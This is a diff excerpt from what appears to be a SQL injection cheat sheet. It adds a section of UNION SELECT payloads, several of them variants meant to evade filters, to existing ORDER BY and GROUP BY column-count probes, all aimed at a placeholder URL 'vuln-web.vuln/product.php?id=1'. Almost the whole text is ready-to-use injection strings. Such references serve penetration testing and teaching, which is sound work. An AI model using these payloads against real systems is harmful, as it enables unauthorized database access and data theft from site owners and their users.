@@ -40,3 +40,13 @@ https://vuln-web.vuln/product.php?id=1' ORDER BY 1 ASC-- -
 
 https://vuln-web.vuln/product.php?id=1' GROUP BY 1 DESC-- -
 ```
+
+**Using UNION Operator To Add Malicious Statement**
+
+```
+https://vuln-web.vuln/product.php?id=1' UNION SELECT 1,2,3,4,5-- -
+https://vuln-web.vuln/product.php?id=1' UNION+ALL+SELECT+null,null,null,null,null-- -
+https://vuln-web.vuln/product.php?id=1' UNION(SELECT(1),(2),(3),(4),(5))-- -
+https://vuln-web.vuln/product.php?id=1' UNION SELECT CHAR(1),CHAR(2),CHAR(3),CHAR(4),CHAR(5)-- -
+https://vuln-web.vuln/product.php?id=1' UNION SELECT * FROM (SELECT 1)a JOIN(SELECT 2)b JOIN(SELECT 3)c JOIN(SELECT 4)d JOIN(SELECT 5)e-- -
+```
